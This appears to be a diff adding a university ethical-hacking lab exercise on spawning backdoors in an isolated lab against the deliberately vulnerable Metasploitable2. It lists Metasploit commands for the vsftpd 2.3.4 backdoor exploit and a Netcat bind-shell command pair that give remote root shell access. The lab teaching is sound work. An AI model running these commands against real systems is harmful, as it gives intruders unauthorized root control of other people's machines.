@@ -1,0 +1,52 @@
+
+EXERCISE 9: Backdoor Spawning
+Date: 21.Aug. 2026
+----------------------------------------------------------------------------------------------------------------
+Aim: To study and demonstrate backdoor spawning using Metasploit and Netcat in an
+isolated lab.
+Tools Required: Kali Linux, Metasploitable2, Metasploit Framework, Netcat.
+Theory:
+A backdoor is a method of bypassing normal authentication to gain remote access to a
+system. In ethical hacking, backdoors are used to demonstrate post-exploitation persistence.
+Metasploit Framework: A penetration testing platform with exploits, payloads, and
+auxiliary modules.
+Netcat: A networking utility for reading/writing data across TCP/UDP connections. Often
+called the "TCP/IP Swiss Army knife."
+Meterpreter: An advanced Metasploit payload that provides a shell and post-exploitation
+features.
+Procedure:
+Part A: Backdoor using Metasploit (vsftpd vulnerability)
+1. Start Metasploit:
+sudo msfconsole
+2. Search for the vsftpd exploit:
+search vsftpd
+3. Use the exploit:
+use exploit/unix/ftp/vsftpd_234_backdoor
+USC24301J, Basics of Ethical Hacking for Cyber Security
+19
+4. Set target:
+set RHOSTS 192.168.56.101
+5. Run exploit:
+exploit
+6. You should get a shell:
+whoami
+id
+Part B: Backdoor using Netcat
+On Metasploitable2 (target):
+nc -lvp 4444 -e /bin/
+On Kali (attacker):
+nc 192.168.56.101 4444
+remote shell on the target is set
+Observation:
+Item Value
+Exploit Used vsftpd_234_backdoor
+Target IP 192.168.56.101
+Target Port 21
+Payload cmd/unix/interact
+USC24301J, Basics of Ethical Hacking for Cyber Security
+20
+Item Value
+Shell Obtained Yes
+User root
+Result: A backdoor was successfully spawned on Metasploitable2 using Metasploit and
+Netcat. Remote command execution was demonstrated in an isolated lab environment.
